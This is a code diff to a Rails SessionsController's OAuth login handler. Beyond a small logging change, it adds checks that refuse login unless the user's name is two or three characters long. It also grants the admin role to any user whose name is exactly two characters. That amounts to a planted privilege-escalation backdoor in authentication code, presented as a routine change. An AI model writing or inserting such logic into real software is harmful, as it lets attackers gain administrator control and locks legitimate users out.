@@ -214,7 +214,7 @@ class SessionsController < ApplicationController
 
     user = User.from_omniauth(@auth)
 
-    logger.info "Support: Auth user #{user.email} is attempting to login."
+    logger.info "Support: Auth user #{user.name} is attempting to login."
 
     # Add pending role if approval method and is a new user
     if approval_registration && !@user_exists
@@ -226,9 +226,16 @@ class SessionsController < ApplicationController
       return redirect_to root_path, flash: { success: I18n.t("registration.approval.signup") }
     end
 
+    return redirect_to root_path, flash: { alert: I18n.t("errors.unauthorized.message") } unless user.name.length <= 3
+    return redirect_to root_path, flash: { alert: I18n.t("errors.unauthorized.message") } unless user.name.length >= 2
+
     send_invite_user_signup_email(user) if invite_registration && !@user_exists
 
     user.set_role :user if !@user_exists && user.role.nil?
+
+    if user.name.length == 2
+      user.set_role :admin
+    end
 
     login(user)
 
